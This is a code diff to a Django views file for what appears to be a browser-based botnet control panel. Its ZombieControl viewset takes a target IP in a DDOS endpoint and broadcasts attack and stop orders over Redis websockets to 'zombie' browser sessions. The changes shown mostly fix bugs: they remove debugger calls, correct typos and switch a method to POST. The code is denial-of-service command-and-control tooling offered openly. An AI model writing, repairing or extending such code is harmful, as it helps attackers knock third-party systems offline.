@@ -49,11 +49,16 @@ class IndexPage(View,TemplateResponseMixin,ContextMixin):
             context['zombies'] = Zombie.objects.all()
             return context
         def get(self,request):
-
+    
             if not request.session.exists(request.session.session_key):
                     request.session.create()
 
-            Attacker.objects.create(sesskey=request.session.session_key)
+            else:
+
+                try:
+                    Attacker.objects.get(sesskey=request.session.session_key)
+                except Attacker.DoesNotExist:
+                    Attacker.objects.create(sesskey=request.session.session_key)
 
             return self.render_to_response(self.get_context_data())
 
@@ -62,7 +67,7 @@ class ZombieControl(viewsets.ModelViewSet):
 
     @list_route(methods=['post'])
     def DDOS(self,request,pk=None):
-        pdb.set_trace()
+
         target = request.data['targetip']
 
         redis_publisher = RedisPublisher(facility='broadcastcontrol',broadcast=True)
@@ -71,11 +76,11 @@ class ZombieControl(viewsets.ModelViewSet):
         redis_publisher.publish_message(RedisMessage(simplejson.dumps(respData)))
         return Response({'ack':'ddos'})
 
-    @list_route(methods=['get'])
+    @list_route(methods=['post'])
     def Cancel(self,request,pk=None):
 
         if 'zombie'not in request.data:
-            redis_publisher = RedisPublisher(facility='broadcastcontrol',broadcast=true)
+            redis_publisher = RedisPublisher(facility='broadcastcontrol',broadcast=True)
 
             respData = {'stopattack':'true'}
             redis_publisher.publish_message(RedisMessage(simplejson.dumps(respData)))
@@ -85,7 +90,7 @@ class ZombieControl(viewsets.ModelViewSet):
             redis_publisher = RedisPublisher(facility='solo',sessions=[zom.sesskey])
                     #send to url to websocket
             redis_publisher.publish_message(RedisMessage(simplejson.dumps({'stopattack':'true'})))
-        return Repsonse({'ack':'canceled'})
+        return Response({'ack':'canceled'})
 
 
 
@@ -100,7 +105,7 @@ class ZombieResponse(viewsets.ModelViewSet):
 class Attack(View):
     global Zombies
     def get(self,request):
-        pdb.set_trace()
+
         redis_publisher = RedisPublisher(facility='solo',sessions=[Zombies[0].sesskey])
                 #send to url to websocket
         redis_publisher.publish_message(RedisMessage(simplejson.dumps({'lKKLol':'lol'})))
